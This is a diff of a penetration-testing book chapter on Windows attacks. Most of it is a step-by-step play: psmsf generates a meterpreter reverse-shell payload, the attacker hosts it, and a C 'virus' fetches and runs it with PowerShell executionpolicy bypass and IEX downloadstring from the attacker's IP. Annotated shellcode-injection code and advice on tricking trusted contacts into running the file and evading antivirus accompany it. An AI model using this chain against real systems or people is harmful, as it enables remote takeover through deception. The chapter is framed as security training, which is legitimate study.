@@ -54,7 +54,7 @@ Windows exploitation is prevalent, easy and fun, because there is what seems to 
 
 The problem is not so much that there is a never ending source of defects in Windows, but rather, that the platform was not designed with openness as a core attribute. Because of its closed nature, hardening the platform in many cases is very difficult and often comes down to applying band-aids over top of the defects rather than being able to remove them.
 
-If you want a platform that you can have some control over the security of, do not buy into closed offerings.
+If you want a platform that you can have a decent level of control over its security, do not buy into closed offerings.
 
 #### PsExec {#vps-identify-risks-psexec}
 ![](images/ThreatTags/average-common-difficult-severe.png)
@@ -223,7 +223,7 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
 
 [By default](https://blogs.msdn.microsoft.com/powershell/2008/10/28/powershell-will-be-installed-by-default-on-windows-server-08-r2-ws08r2-and-windows-7-w7/), PowerShell is installed on Windows Server 2008 R2 and Windows 7 onwards.
 
-PowerShell "_is going to be on all boxes and it going provide access to everything on the box_" Excellent news for penetration testers and other attackers!
+PowerShell "_is going to be on all boxes and it going provide access to everything on the box_" This is excellent news for penetration testers and other attackers!
 
 On Windows Server from PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2), the default execution policy is RemoteSigned, but that is easily overridden in a script as you will see soon. We:
 
@@ -234,14 +234,14 @@ On Windows Server from PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2), the
 Then you just need to get some code run on your targets machine. There are many ways to achieve this. Off the top of my head:
 
 * Find someone that your target trusts and become (pretext) them, services like LinkedIn are good for this, as that will generally allow you to piece the organisations structure together with freely available OSINT that will not ring any alarm bells. It is pretty easy to build a decent replica of the organisations trust structure this way. Then you will have implicit trust. They will run your code or open your office document
-* Just befriend your target or someone close enough to your target inside the target organisation, have them run your code once they trust you. Then traverse once you have persistence on a machine
+* Just befriend your target or someone close enough to your target inside the target organisation, have them run your code once they trust you. Then traverse once you have persistence on their machine
 * Find someone that usually sends files or links to files via email or similar and spoof the from address as discussed in the People chapter.
 * CD, DVD, USB stick drops, etc.
 * Using existing credentials you obtained by any of the means detailed in the People chapter and maybe logging into Outlook Web Access (OWA) or similar. Most people still use the same or similar passwords for multiple accounts. You only need one of them from someone on the targets network.
 
-Metasploit or Set generating office files or pdfs usually trigger AV, but this is much easier to get around with PowerShell.
+Metasploit or setoolkit generating office files or pdfs usually trigger AV, but this is much easier to get around with PowerShell.
 
-Traditionally the payload would have to be saved to the targets file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with HIDS/HIPS. AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts, as it is so easy to make changes to the script, but keep the script intent doing the same thing. To make matters worse, PowerShell is tightly integrated now with the Windows Operating Systems and with all the power of the .NET framework.
+Traditionally the payload would have to be saved to the targets file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with [HIDS/HIPS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids). AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts, as it is so easy to make changes to the script, but keep the script intent doing the same thing. To make matters worse, PowerShell is tightly integrated now with the Windows Operating Systems.
 
 So what we are doing is making our viruses and payloads look like chameleons or business as usual (BAU), to detection mechanisms.
 
@@ -273,36 +273,45 @@ So what we are doing is making our viruses and payloads look like chameleons or 
 
 
 
-You can find the video of how it is played out at []().
+
 
 I> ## Synopsis
 I>
-I> We will be using a reverse shell 
-I> Virus
-I> Payload
+I> In this play, we will use `psmsf` to create a Metasploit resource file to get msfconsole on our attacking machine listening for a reverse tcp shell from our target. `psmsf` will also leverage `msfvenom` to create native windows shellcode from c. `psmsf` inserts this shellcode into a PowerShell script then base64 encodes it, and adds it to a text file prefixed with a PowerShell command to run the base64 encoded PowerShell script.
 I>
-I> Listener is listening
-I> Payload copied to hosting directory and web server started
-I> Create and compile virus.
-I> Target: Run virus
-I> Attacker collects reverse shell
+I> We then upload / host the payload generated by `psmsf`.
+I> 
+I> We then create a small c file (that we call the virus) that downloads and executes the PowerShell paylaod we have hosted. The c file needs to be compiled on the target platform, and given to our victim to run.
+I>
+I> Our target runs the virus.  
+I> The virus downloads and executes the payload.  
+I> The payload runs the base64 encoded script inside it, which spawns a thread and runs immediately from the calling instance of PowerShell which executes a section of memory that we over-write with the shellcode. This runs the reverse shell that the attacking machine is listening for.
 
-If you do not already have psmsf on your attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
+Meterpreter is an excellent platform for attacking with. It provides us with many useful tools which make tasks like privilege escalation, establishing persistence, lateral movement, pivoting, and others, much easier.
+
+The other payloads available via `psmsf` are:
+
+* `windows/shell/reverse_tcp`
+* `windows/meterpreter/reverse_http`
+
+You can find the video of how this attack is played out at []().
+
+If you do not already have `psmsf` on your attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
 
 {icon=bomb}
 G> ## The Play
 G>
-G> Go ahead and run it, you will be provided with the details you need to take the next steps.
+G> Go ahead and run `psmsf`, you will be provided with the details you need to take the next steps.
 G>
 G> Next we run:  
-G> `/opt/psmsf$ python psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost <listener-attack-ip> --lport 4444'
+G> `/opt/psmsf$ python psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost <listener-attack-ip> --lport 4444`
 G>
-G> If you do not specify an output directory for the attack files that psmsf creates, it will create the `powershell_attack` directory in your current directory, then generate the PowerShell attack files for us within it. The PowerShell attack files are:  
-G> 1. `powershell_msf.rc` (the resource file we can feed to `msfconsole`)
-G> 2. `powershell_hacking.bat` (the PowerShell shellcode payload)
+G> If you do not specify an output directory for the attack files that `psmsf` creates, it will create the `powershell_attack` directory in your current directory, then generate the PowerShell attack files for you within it. The PowerShell attack files are:  
+G>  1. `powershell_msf.rc` (the resource file we can feed to `msfconsole`)
+G>  2. `powershell_hacking.bat` (the PowerShell base64 encoded payload with embedded shellcode)
 G>
 G> Start your listener using the `powershell_msf.rc` resource rile:  
-G> `msfconsole -r powershell_msf.rc'  
+G> `msfconsole -r powershell_msf.rc`  
 G> or just load the same parameters from the resource file once you have msfconsole running, and follow with:  
 G> `exploit -j`:
 G>
@@ -314,15 +323,17 @@ G> `msf exploit(handler) >`
 G> `msf exploit(handler) >`
 G>
 G> The target now needs to run the payload `powershell_hacking.bat`. This can be run anywhere that PowerShell is available, and it will open a reverse meterpreter shell which is embedded within the `powershell_hacking.bat` payload to your listener. Some options:  
-G> * Copy paste the contents of the file into a Windows terminal
-G> * Run the file directly: `cmd.exe /c powershell_hacking.bat`
+G>  * Copy paste the contents of the file into a Windows terminal
+G>  * Run the file directly: `cmd.exe /c powershell_hacking.bat`
 G>
 G> Either of these two options are fine if you have access to the targets machine. If not, you will really need to conceal your true intent from the target that we have built a trust relationship with. We need to hide not only the payload (intent) contents, but also the code (virus) that fetches the payload and runs it (not yet discussed).
 G>
-G> OK, so let us host our payload:
+G> Host your payload:
 G>
 G> Copy `powershell_hacking.bat` so our target can unknowingly fetch and run it:  
-G> `/opt/psmsf/powershell_attack$ sudo cp powershell_hacking.bat /var/www/html/payload.txt`  
+G> `/opt/psmsf/powershell_attack$ sudo cp powershell_hacking.bat /var/www/html/payload.txt`
+
+{icon=bonb}
 G> Start our web server:  
 G> `Service apache2 start`  
 G> `curl <listener-attack-ip>/payload.txt or just browse the payload to verify that it is hosted.
@@ -333,22 +344,22 @@ G> `#include<stdio.h>`
 G> `#include<stdlib.h>`  
 G> `int main()`  
 G> `{`  
-G> `   // Once the following line has executed, we will have our shell.`  
-G> `   // system executes any command string you pass it.`  
-G> `   // Windows is happy with PowerShell of course.`  
-G> `   // noprofile causes no profile scripts to be loaded up front.`  
-G> `   // Not sure if script execution is enabled on target system? No problem, just set executionpolicy to bypass for this session.`  
-G> `   // This tells PowerShell to just trust that you know what you are doing, and that we are happy to download and run a malicious payload.`  
-G> `   // Invoke the EXpression: download the payload and execute it.`  
-G> `   // Providing the payload does not trigger anti virus, this should not.`
-G> `   system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");`
+G> `  // Once the following line has executed, we will have our shell.`  
+G> `  // system executes any command string you pass it.`  
+G> `  // Windows is happy with PowerShell of course.`  
+G> `  // noprofile causes no profile scripts to be loaded up front.`  
+G> `  // Not sure if script execution is enabled on target system? No problem, just set executionpolicy to bypass for this session.`  
+G> `  // This tells PowerShell to just trust that you know what you are doing, and that we are happy to download and run a malicious payload.`  
+G> `  // Invoke the EXpression: download the payload and execute it.`  
+G> `  // Providing the payload does not trigger anti virus, this should not.`
+G> `  system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");`
 G>
-G> `   // Add content here to make your target think this is a legitimate helpful tool.`  
-G> `   // Or just do nothing and you may have to explain to your target that it is broken.`  
+G> `  // Add content here to make your target think this is a legitimate helpful tool.`  
+G> `  // Or just do nothing and you may have to explain to your target that it is broken.`  
 G>
-G> `   // Add the following if you want the terminal to stay open.`  
-G> `   //char buff[10];`  
-G> `   //fgets (buff, sizeof(buff), stdin);`  
+G> `  // Add the following if you want the terminal to stay open.`  
+G> `  //char buff[10];`  
+G> `  //fgets (buff, sizeof(buff), stdin);`  
 G> `}`
 G>
 G> With this, neither the payload or the virus should trigger Anti-Virus.
@@ -477,7 +488,7 @@ G> `ss -ant` Will confirm that we are not listening on `4444` any more.
 
 **PowerShell Payload creation details**
 
-When psmsf is run as per above  
+When `psmsf` is run as per above  
 The Metasploit `windows/meterpreter/reverse_tcp` `shellcode` is generated by running msfvenom programmatically as the following:  
 
 {linenos=off, lang=bash}
@@ -485,73 +496,87 @@ The Metasploit `windows/meterpreter/reverse_tcp` `shellcode` is generated by run
     # msfvenom --help-formats # Lists all the formats available with description.
     # msfvenom --list encoders # Lists all the encoders available with description.
 
-psmsf then takes the generated output and strips out the characters that don’t actually form part of the raw shellcode, like an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.
+`psmsf` then takes the generated output and in a function called `extract_msf_shellcode` strips out the characters that do not actually form part of the raw shellcode, like an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.
 
-psmsf then replaces any instances of `\x` with `0x`
+`psmsf` then replaces any instances of `\x` with `0x`.
 
-Psmsf then passes the cleaned up reverse_tcp shellcode to a function (`generate_powershell_script`) that embeds it into a PowerShell script that is going to become the main part of our payload.
+`psmsf` then passes the cleaned up `reverse_tcp` shellcode to a function (`generate_powershell_script`) that embeds it into a PowerShell script that is going to become the main part of our payload.
 
-That code looks like the following, I have added the annotations to help you work out how it works:
+That code looks like the following, I have added the annotations to help you understand how it works:
 
 
 {title="psmsf", linenos=off, lang=python}
     def generate_powershell_script(shellcode):
-       shellcode = (
-          # Assign a reference to the string that is the C# signature of the VirtualAlloc, CreateThread, and memset function... to $c.
-          # Assign a reference to the string that starts immediatly before $c and finishes at the end of the Start-sleep command... to S1.
-          "$1 = '$c = ''"
-          # Import the kernel32.dll that has the native VirtualAlloc function we later use to provide us with the starting position in memory to write our shellcode to.
-          "[DllImport(\"kernel32.dll\")]"
-          "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
-          "[DllImport(\"kernel32.dll\")]"
-          "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
-          "[DllImport(\"msvcrt.dll\")]"
-          "public static extern IntPtr memset(IntPtr dest, uint src, uint count);"
-          "'';"
+      shellcode = (
+        # Assign a reference to the string that is the C# signature of the VirtualAlloc,
+        #    CreateThread, and memset function... to $c.
+        # Assign a reference to the string that starts immediately before $c and finishes at
+        #    the end of the Start-sleep command... to S1.
+        "$1 = '$c = ''"
+        # Import the kernel32.dll that has the native VirtualAlloc function we later use
+        #    to provide us with the starting position in memory to write our shellcode to.
+        "[DllImport(\"kernel32.dll\")]"
+        "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
+        "[DllImport(\"kernel32.dll\")]"
+        "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
+        "[DllImport(\"msvcrt.dll\")]"
+        "public static extern IntPtr memset(IntPtr dest, uint src, uint count);"
+        "'';"
     
-          # Add a VirtualAlloc, CreateThread, and memset functions of the C# signatures we assigned to $c to the PowerShell session as static methods of a class that Add-Type is about to create on the fly.
-          # Add-Type uses Platform Invoke (P/Invoke) to call the VirtualAlloc, CreateThread, and memset functions as required from the kernel32.dll.
-          # The Name and namespace parameters are used to prefix the new type. passthru is used to create an object that represents the type which is then assigned to $w
-          "$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;"
+        # Add a VirtualAlloc, CreateThread, and memset functions of the C# signatures we
+        #    assigned to $c to the PowerShell session as static methods
+        #    of a class that Add-Type is about to create on the fly.
+        # Add-Type uses Platform Invoke (P/Invoke) to call the VirtualAlloc, CreateThread,
+        #    and memset functions as required from the kernel32.dll.
+        # The Name and namespace parameters are used to prefix the new type. passthru is used
+        #    to create an object that represents the type which is then assigned to $w
+        "$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;"
     
-          # Create Byte array and assign our prepped reverse_tcp shellcode.
-          "[Byte[]];[Byte[]]"
-          "$z = %s;"
-          "$g = 0x1000;"
-          "if ($z.Length -gt 0x1000){$g = $z.Length};"
+        # Create Byte array and assign our prepped reverse_tcp shellcode.
+        "[Byte[]];[Byte[]]"
+        "$z = %s;"
+        "$g = 0x1000;"
+        "if ($z.Length -gt 0x1000){$g = $z.Length};"
     
-          # Starting at the first virtual address in the space of the calling process (which will be a PowerShell instance),
-          # allocate 0x1000 bytes, set to zero, but only when a caller first accesses when we memset below,
-          # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx
-          # and enable execute, read-only, or read/write access (0x40) to the committed region of pages.
-          # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
-          # Essentially just allocate some (all permissions) memory at the start of PowerShell that is executing this
-          # and assign the base address of the allocated meory to $x.
+        # Starting at the first virtual address in the space of the calling process
+        #    (which will be a PowerShell instance),
+        # allocate 0x1000 bytes, set to zero, but only when a caller first accesses
+        #    when we memset below,
+        # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx
+        # & set execute, read-only, or read/write access (0x40) to the committed region of pages.
+        # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
+        # Essentially just allocate some (all permissions) memory at the start of PowerShell
+        #    that is executing this & assign the base address of the allocated memory to $x.
     
-          "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
+        "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
     
-          # Set the memory that $x points to (first 0x1000 bytes of the calling PowerShell instance) to the memory that $z points to (the (reverse shell) shellcode that msvenom gives us).
-          "for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"
-          # Create a thread to execute within the virtual address space of the calling PowerShell (which happens on the last line).
-          # The third parameter represents the starting address of the thread, the shellcode to be executed by the thread.
-          # Setting the fifth parameter to 0 declares that the thread should run immediately after creation, .
-          # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682453(v=vs.85).aspx
-          "$w::CreateThread(0,0,$x,0,0,0);"
-          # Start-sleep just provides some time for the shellcode (reverse shell) to execute.
-          "for (;;){Start-sleep 60};';"
-          # Notice the last single quote above? That is the end of the string that is assigned to $1.
-          # $e is assigned the base 64 encoded string that $1 references.
-          "$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"
-          "$2 = \"-enc \";"
+        # Set the memory that $x points to
+        #    (first 0x1000 bytes of the calling PowerShell instance) to the memory
+        #    that $z points to (the (reverse shell) shellcode that msvenom gives us).
+        "for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"
+        # Create a thread to execute within the virtual address space of the calling PowerShell
+        #    (which happens on the last line).
+        # The third parameter represents the starting address of the thread, the shellcode to be executed by the thread.
+        # Setting the fifth parameter to 0 declares that the thread should run
+        #    immediately after creation.
+        # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682453(v=vs.85).aspx
+        "$w::CreateThread(0,0,$x,0,0,0);"
+        # Start-sleep just provides some time for the shellcode (reverse shell) to execute.
+        "for (;;){Start-sleep 60};';"
+        # The last single quote above is the end of the string that is assigned to $1.
+        # $e is assigned the base 64 encoded string that $1 references.
+        "$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"
+        "$2 = \"-enc \";"
     
-          # Check if the current process is 64 bit (8 bytes), or something else (32 bit assumed),
-          # then Invoke EXpression (at specific 64 bit path or 32 bit) PowerShell with base64 encoded $e, which references the now base64 encoded string that is most of this script.
+        # Check if the current process is 64 bit (8 bytes), or something else (32 bit assumed),
+        #    then Invoke EXpression (at specific 64 bit path or 32 bit) PowerShell with base64
+        #    encoded $e, which references the now base64 encoded string that is most of this script.
     
-          "if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\syswow64\WindowsPowerShell\\v1.0\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}"
-          % shellcode
-       )
+        "if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\syswow64\WindowsPowerShell\\v1.0\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}"
+        % shellcode
+      )
     
-       return shellcode
+      return shellcode
 
 
 
